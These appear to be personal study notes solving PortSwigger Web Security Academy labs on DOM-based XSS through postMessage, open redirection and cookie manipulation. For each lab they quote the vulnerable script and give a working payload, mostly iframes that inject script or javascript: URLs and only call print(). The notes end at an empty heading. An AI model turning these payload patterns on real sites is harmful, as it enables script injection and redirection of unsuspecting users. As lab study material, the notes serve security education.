### Lab: DOM XSS using web messages
Explanation:
Let's say we have our own html page.
On our page we have:
```bash
<script>
    window.addEventListener('message', function(e) {
        console.log(e.data);
    })
</script>
```
And some kind of a button, that when clicked it executes the following code:
```bash
window.postMessage("hello world")
```
So whenever that button is clicked it consoles log "hello world"

So even though `window.postMessage` can be used cross site, it can also be used on the same site.

Definition from MDN: The window.postMessage() method safely enables cross-origin communication between Window objects; e.g., between a page and a pop-up that it spawned, or between a page and an iframe embedded within it.

#### Exploiting the lab:
On the main page we have:
```bash
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```
And we have:
```bash
<div id='ads'>
```
Which means whatever we are going to pass to window.postMessage(), is going to be injected (via `innerHtml = e.data`) onto the page.

So we create a new page on the server that we control and we paste the following:
```bash
<iframe src="https://0a9c008e037b9aae80e021720045005f.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```
That iframe will load vulnerable website inside the iframe and `onload` will execute `contentWindow.postMessage('<img src=1 onerror=print()>','*')`, and therefore `print()` is going to be executed.

All that is needed is for user to visit our page from the server that we control.

### Lab: DOM XSS using web messages and a JavaScript URL
This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the print() function. 

We have:
```bash
window.addEventListener('message', function(e) {
    var url = e.data;
    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
        location.href = url;
    }
}, false);
```

Solution:
```bash
<iframe src="https://0a51008103b44997808c125400d50058.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```

### Lab: DOM XSS using web messages and JSON.parse
We have:
```bash
window.addEventListener('message', function(e) {
    var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
    document.body.appendChild(iframe);
    try {
        d = JSON.parse(e.data);
    } catch(e) {
        return;
    }
    switch(d.type) {
        case "page-load":
            ACMEplayer.element.scrollIntoView();
            break;
        case "load-channel":
            ACMEplayer.element.src = d.url;
            break;
        case "player-height-changed":
            ACMEplayer.element.style.width = d.width + "px";
            ACMEplayer.element.style.height = d.height + "px";
            break;
    }
}, false);
```

So I tried:
```bash
<iframe src="https://0a27005803cfe64980103a0a00ba007e.web-security-academy.net/" onload="this.contentWindow.postMessage('{"type": "load-channel", "url": "javascript:print()"}','*')">
```
It didn't work. Because " sign terminated the string that is opened after `onload` earlier. 

Here's the solution:
```bash
<iframe src=https://0a27005803cfe64980103a0a00ba007e.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

### Lab: DOM-based open redirection
The page has:
```bash
 <a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
```

`location` object contains the value from the browser url bar as one of its properties.

To solve the lab we need to redirect a user (when they click on Back to Blog btn) to the exploit server. For that purpose we need to modify the url in the following way:
```bash
https://0ac400ec04f118e280002b5b00db00fa.web-security-academy.net/post?postId=10&url=https://exploit-0a7100f70445184f80b82a2701920042.exploit-server.net/exploit
```
And the lab is solved


### Lab: DOM-based cookie manipulation
We have products and whenever we click on some product, the page with that product description is opened. It contains the following:
```bash
<script>
    document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```
That website has a button: "Last viewed product":
```bash
<a href="https://0a7900b10398d71489664b8c000600c2.web-security-academy.net/product?productId=3">Last viewed product</a>
```
The value that is placed in `<a href="...">` is taken from the `lastViewedProduct` cookie.

We can therefore try to escape `<a>` tag and append `<script>` after it:
```
https://0a7900b10398d71489664b8c000600c2.web-security-academy.net/product?productId=2&'><script>print()</script>
```
As a result the value of cookie becomes:
```
https://0a7900b10398d71489664b8c000600c2.web-security-academy.net/product?productId=2&%27%3E%3Cscript%3Eprint()%3C/script%3E
```
After that when we go to the Home page here's what we find there:
```
<a href='https://0a7900b10398d71489664b8c000600c2.web-security-academy.net/product?productId=2&'><script>print()</script>'>Last viewed product</a><p>|</p>
```
As you can see we have successfully escaped `<a>` tag.

The problem is that we still have to go to 2 different pages. First to a specific product page and later to the Home page. Iframe can help us with that.

Here's the lab solution:
```bash
<iframe src="https://0a7900b10398d71489664b8c000600c2.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">
```
So when it is first loaded it sets the value of the cookie with malicious js.
Then `onload` event is triggered and the victim is redirected to Home page. On the home page the value from malicious cookie is taken and js code is executed.

Note we need this `window.x=1` and of course `if(!window.x)` because we don't want `onload` to stuck in a loop. We only want it to be executed once.

### Lab: Exploiting DOM clobbering to enable XSS


